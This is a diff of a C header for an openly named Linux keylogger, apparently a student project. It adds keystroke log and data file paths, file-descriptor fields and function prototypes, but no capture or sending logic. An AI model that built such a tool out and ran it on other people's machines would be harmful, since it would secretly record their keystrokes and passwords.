@@ -9,12 +9,11 @@
 #include <linux/input.h>
 #include <sys/stat.h>
 
+#include "libft.h"
+
 # define KEYBOARD_CST 0
-# define TRUE 1
-# define FALSE 0
-# define SUCCESS 0
-# define ERROR 1
-# define INTERUPT 2
+# define LOGPATH  "/home/user42/Bureau/keylogger/logs/keylog.log"
+# define DATAPATH "/home/user42/Bureau/keylogger/klg.data"
 
 typedef struct	s_mod
 {
@@ -30,6 +29,10 @@ typedef struct	s_keylogger
 	char				*kbdfile;
     struct input_event	event;
 	char				*keymap[257][8];
+	char				*rawMap;
+	char				*event_location;
+	int					logFD;
+	int					dataFD;
 	int					saveFD;
 	int					saveLineFD;
 	int					keyboardFD;
@@ -42,7 +45,9 @@ int     lentochar(char *s, char c);
 void    ft_putstr(char *s);
 void    ft_putchar(char c);
 void	ft_strncpy(char *dest, char *src, int n);
-
+void	keylogger(void);
+void    signal_handle();
+t_keylogger *getKlg(void);
 
 #include "keymap.h"
 
